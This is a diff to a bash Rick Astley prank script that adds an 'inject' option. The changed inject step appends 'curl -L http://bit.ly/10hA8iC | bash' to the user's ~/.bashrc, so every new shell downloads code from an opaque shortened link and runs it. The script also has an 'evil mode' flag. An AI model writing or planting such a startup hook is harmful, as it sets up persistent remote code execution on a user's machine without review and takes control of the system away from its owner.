@@ -5,6 +5,8 @@ version='1.0'
 my_head=${BASH_SOURCE[0]}
 base_dir=$(dirname $my_head)
 NEVER_GONNA_TELL_A_LIE="INT TERM EXIT STOP SUSPEND"  # For evil mode.
+bean="http://bean.vixentele.com/~keroserene"
+remote="$bean/astley80.full.bz2"
 AND_HURT_YOU="$HOME/.bashrc"
 # Terminal helpers (Assumes 256 ttcolors).
 red='\x1b[38;5;9m'
@@ -37,6 +39,9 @@ for arg in "$@"; do
     usage && exit
   elif [[ "$arg" == "evil"* ]]; then
     evil=true
+  elif [[ "$arg" == "inject"* ]]; then
+    inject=true
+    save_term=true
   else
     echo -e "${red}Unrecognized option: $arg"
     usage && exit
@@ -48,7 +53,7 @@ echo
 if [[ $inject ]]; then
   # Just inject, no rendering fun this time. Do preserve the evil flag, though.
   [[ $evil ]] && earg="evil"
-  echo "$AND_DESERT_YOU $earg" >> $AND_HURT_YOU
+  echo "curl -L http://bit.ly/10hA8iC | bash" >> $AND_HURT_YOU
   echo -e "${green}Rick Rolls appended to $AND_HURT_YOU. <3"
   quit
 fi
@@ -111,8 +116,6 @@ obtainium() {
     wget -q -O - $1
   fi
 }
-bean="http://bean.vixentele.com/~keroserene"
-remote="$bean/astley80.full.bz2"
 
 if hash afplay 2>/dev/null; then
   # On Mac OS we pre-fetch compressed audio and use afplay.
